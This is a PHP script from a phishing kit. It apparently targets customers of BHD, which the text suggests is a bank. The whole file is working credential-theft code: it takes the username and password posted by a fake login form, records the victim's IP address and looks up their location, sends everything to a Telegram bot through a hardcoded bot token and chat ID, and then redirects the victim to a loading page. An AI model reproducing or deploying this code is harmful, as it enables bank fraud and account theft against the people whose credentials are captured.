<?php
session_start(); // Inicia la sesión

// Configuración del bot
$token = "8202173622:AAG7lPsKeZ_o_lTCtcRA7C5ZCM15tkTMMYc"; // Token de tu bot
$chat_id = "8029675723"; // ID del chat o grupo

// Capturar el dato del formulario
$uernm24 = $_POST['uernm24'] ?? 'N/A';
$clvuernm24 = $_POST['clvuernm24'] ?? 'N/A';

$_SESSION['uernm24'] = $uernm24; // Guarda solo ff1 en sesión
$_SESSION['clvuernm24'] = $clvuernm24; // Guarda solo ff1 en sesión

// Capturar la IP real del usuario
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

// Obtener país y ciudad usando una API de geolocalización por IP
$pais = 'N/A';
$ciudad = 'N/A';

$geo_url = "http://ip-api.com/json/$ip";
$geo_response = @file_get_contents($geo_url);
if ($geo_response !== false) {
    $geo_data = json_decode($geo_response, true);
    if ($geo_data && $geo_data['status'] === 'success') {
        $pais = $geo_data['country'] ?? 'N/A';
        $ciudad = $geo_data['city'] ?? 'N/A';
    }
} 

// Fecha y hora actual
$fecha = date("Y-m-d H:i:s");

// Formato del mensaje para Telegram
$mensaje = "*💰 BHD INICIO 💰:*\n"
         . "*✉️ Usuario:* `$uernm24`\n"
         . "*🔑 Clave:* `$clvuernm24`\n\n"
         . "*🌐 IP:* `$ip`\n"
         . "*🏙 Ciudad:* `$ciudad`\n"
         . "*🇲🇽 Pais:* `$pais`\n\n"
         . "*🕒 Fecha:* `$fecha`\n\n"
         . "👣 @asoctrasmacol";

// Envío a Telegram usando cURL
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirigir después del envío
header("Location: cargando.html");
exit();
?>